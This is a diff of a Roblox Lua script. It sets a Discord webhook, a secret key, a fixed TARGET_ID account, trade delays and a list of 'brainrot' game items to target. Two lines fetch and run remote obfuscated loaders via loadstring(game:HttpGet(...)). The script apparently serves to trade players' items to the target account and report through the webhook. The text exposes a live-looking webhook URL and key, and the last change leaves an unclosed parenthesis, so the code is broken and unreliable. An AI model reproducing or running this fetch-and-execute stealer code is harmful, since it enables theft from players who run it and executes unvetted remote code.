@@ -1,7 +1,8 @@
-getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1478411951796260956/VjORucfdYS8pMoTra6VnMGYlR1DMmrb8BCcVWJuE1mMLIxOhYyYstX7VV3Dmjdfb4rCD"
+getgenv().SECRET_KEY = "mrr_ca327e0bdce54235824f3f36330b3b4a"
 getgenv().TARGET_ID = 1718063814
 getgenv().DELAY_STEP = 1      
-getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1478411951796260956/VjORucfdYS8pMoTra6VnMGYlR1DMmrb8BCcVWJuE1mMLIxOhYyYstX7VV3Dmjdfb4rCD"
 getgenv().TARGET_BRAINROTS = {
     ["Meowl"] = true,
     ["Skibidi Toilet"] = true,
@@ -184,5 +185,5 @@ task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
 end)
 task.spawn(function()
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/d8f06d98ed7e8f1128b6efbb9028d563.lua"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/d8f06d98ed7e8f1128b6efbb9028d563.lua"))(
 end)
